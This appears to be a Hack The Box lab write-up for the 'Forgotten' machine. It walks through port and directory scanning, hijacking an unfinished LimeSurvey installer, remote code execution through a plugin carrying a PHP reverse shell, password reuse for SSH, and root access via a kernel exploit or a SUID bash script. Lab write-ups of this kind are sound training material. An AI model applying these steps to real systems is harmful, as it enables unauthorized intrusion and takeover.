---
date: 2026-06-12
categories: [Linux, Easy]
---

<img width="300" height="300" alt="Forgotten" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c3b1f6fcd23aad6913c75b9ea0ca7292.png" />

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [xct](https://app.hackthebox.com/users/13569)    | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---






## Enumeration

- I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.129.234.81 -oG scan
	/opt/extractports scan
	nmap -p22,80 -sCV 10.129.234.81 -oN ports
	```

## Web Enumeration

- I performed directory enumeration using `gobuster` and discovered a `/survey` endpoint:

	```python
	gobuster dir --url "http://10.129.234.81/" --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
	```

- Navigating to the endpoint revealed a **LimeSurvey 6.3.7** installer that had not yet been completed.

## LimeSurvey Installation Abuse

- Since the installer was accessible and no database had been configured yet, I proceeded through the installation steps to gain administrative access to the application.

- I spun up a local MySQL instance using Docker to use as the LimeSurvey database backend:

	```python
	docker run --name limesurvey-mysql \
	  -e MYSQL_ROOT_PASSWORD=rootpass123 \
	  -e MYSQL_DATABASE=limesurvey \
	  -e MYSQL_USER=limeuser \
	  -e MYSQL_PASSWORD=limepassword \
	  -p 3306:3306 -d mysql:latest
	```

- I configured the installer to point to my attacker machine's database using the following settings:

	```python
	Database location : 10.10.15.157:3306
	Database user     : limeuser
	Database password : limepassword
	Database name     : limesurvey
	```

- After clicking "Populate database", the installation completed successfully, providing default administrator credentials: `admin:password`.

## Remote Code Execution via Malicious Plugin

- Once authenticated to the LimeSurvey admin panel, I navigated to the Plugin Manager and prepared a malicious plugin ZIP file containing a PHP reverse shell and a valid `config.xml` manifest sourced from a [public example repository](https://gitlab.com/SondagesPro/SampleAndDemo/ExampleSettings/-/blob/master/config.xml?ref_type=heads).

- I uploaded and installed the plugin through the interface, then triggered code execution by accessing the uploaded `rev.php` file directly:

	```python
	GET /survey/upload/plugins/ExampleSettings/rev.php?cmd=id
	```

- The response confirmed execution as `limesvc`. I then launched a reverse shell and confirmed the environment was a **Docker container** (no `ipconfig`, IP in the `172.17.0.0/16` range).

## Credential Discovery & Container Escape

- Inspecting the container's environment variables revealed the LimeSurvey application password in plaintext:

	```python
	env | grep -i pa
	# LIMESURVEY_PASS=5W5HN4K4GCXf9E
	```

- Running `sudo -l` inside the container showed that `limesvc` could execute any command as root. I escalated to root within the container:

	```python
	sudo su
	```

- Crucially, the same credentials (`limesvc:5W5HN4K4GCXf9E`) were valid for SSH access on the **real host machine**, allowing me to escape the container entirely:

	```python
	ssh limesvc@10.129.234.81
	```

- Once connected to the host, I retrieved the first flag.

## Privilege Escalation

- After enumerating the system with LinPEAS, I identified the host was vulnerable to **CVE-2026-31431**, a kernel-level privilege escalation affecting Linux kernel 6.8.0-1033-aws.

- I used a public PoC to exploit the vulnerability and obtained a root shell:

	```python
	python3 a.py
	# id
	uid=0(root) gid=2000(limesvc) groups=2000(limesvc)
	```

- As an alternative path, from inside the Docker container (where I already had root), I wrote a SUID escalation script to the shared volume mounted at `/opt/limesurvey`, which was accessible from the host:

	```python
	# Inside the container (root@efaa6f5097ed)
	echo "chmod u+s /bin/bash" > /var/www/html/survey/privesc.sh
	chmod 777 /var/www/html/survey/privesc.sh
	```

- From the host, the script was visible at `/opt/limesurvey/privesc.sh`. Executing it set the SUID bit on `/bin/bash`, allowing a privileged shell:

	```python
	/bin/bash -p
	# whoami
	root
	```

- With root access on the host, I retrieved the final flag.
